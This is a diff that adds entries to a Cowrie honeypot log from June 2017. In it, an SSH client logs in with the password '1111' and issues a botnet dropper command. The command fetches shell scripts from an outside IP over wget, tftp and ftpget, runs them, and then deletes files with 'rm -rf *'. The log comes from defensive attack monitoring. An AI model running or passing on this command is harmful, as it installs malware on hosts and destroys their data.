@@ -8057,3 +8057,30 @@
 2017-06-07T18:18:52+0000 [CowrieTelnetTransport,25174,51.15.44.41] login attempt [sh//bin/busybox ECCHI] failed
 2017-06-07T18:18:52+0000 [CowrieTelnetTransport,25174,51.15.44.41] Warning: state changed and new state returned
 2017-06-07T18:18:59+0000 [CowrieTelnetTransport,25173,51.15.44.41] Connection lost after 50 seconds
+2017-06-07T18:19:02+0000 [CowrieTelnetTransport,25172,51.15.44.41] Connection lost after 53 seconds
+2017-06-07T18:19:23+0000 [CowrieTelnetTransport,25174,51.15.44.41] Connection lost after 42 seconds
+2017-06-07T18:19:49+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 154.16.3.104:37214 (10.8.41.81:2222) [session: 1339d146]
+2017-06-07T18:19:49+0000 [HoneyPotSSHTransport,9204,154.16.3.104] Remote SSH version: SSH-2.0-libssh2_1.4.2
+2017-06-07T18:19:49+0000 [HoneyPotSSHTransport,9204,154.16.3.104] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-06-07T18:19:49+0000 [HoneyPotSSHTransport,9204,154.16.3.104] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-07T18:19:49+0000 [HoneyPotSSHTransport,9204,154.16.3.104] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-07T18:19:49+0000 [HoneyPotSSHTransport,9204,154.16.3.104] NEW KEYS
+2017-06-07T18:19:49+0000 [HoneyPotSSHTransport,9204,154.16.3.104] starting service 'ssh-userauth'
+2017-06-07T18:19:49+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,9204,154.16.3.104] '1111' trying auth 'password'
+2017-06-07T18:19:49+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,9204,154.16.3.104] login attempt: 108
+2017-06-07T18:19:49+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,9204,154.16.3.104] login return, expect: [1111/1111]
+2017-06-07T18:19:51+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,9204,154.16.3.104] login attempt [1111/1111] succeeded
+2017-06-07T18:19:53+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,9204,154.16.3.104] '1111' authenticated with 'password'
+2017-06-07T18:19:53+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,9204,154.16.3.104] starting service 'ssh-connection'
+2017-06-07T18:19:53+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,9204,154.16.3.104] got channel 'session' request
+2017-06-07T18:19:53+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,9204,154.16.3.104] channel open
+2017-06-07T18:19:53+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,9204,154.16.3.104] executing command "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.174.34.70/Swag.sh; chmod 777 Swag.sh; sh Swag.sh; tftp 107.174.34.70 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 107.174.34.70; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 107.174.34.70 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf Swag.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *"
+2017-06-07T18:19:53+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,9204,154.16.3.104] Opening TTY Log: log/tty/20170607-181953-1339d146-0e.log
+2017-06-07T18:19:53+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,9204,154.16.3.104] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.174.34.70/Swag.sh; chmod 777 Swag.sh; sh Swag.sh; tftp 107.174.34.70 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 107.174.34.70; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 107.174.34.70 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf Swag.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *
+2017-06-07T18:19:53+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,9204,154.16.3.104] Command found: cd /tmp
+2017-06-07T18:19:53+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,9204,154.16.3.104] Command found: cd /var/run
+2017-06-07T18:19:53+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,9204,154.16.3.104] Command found: cd /mnt
+2017-06-07T18:19:53+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,9204,154.16.3.104] Command found: cd /root
+2017-06-07T18:19:53+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,9204,154.16.3.104] Command found: cd /
+2017-06-07T18:19:53+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,9204,154.16.3.104] Command found: wget http://107.174.34.70/Swag.sh
+2017-06-07T18:19:53+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://107.174.34.70/Swag.sh>
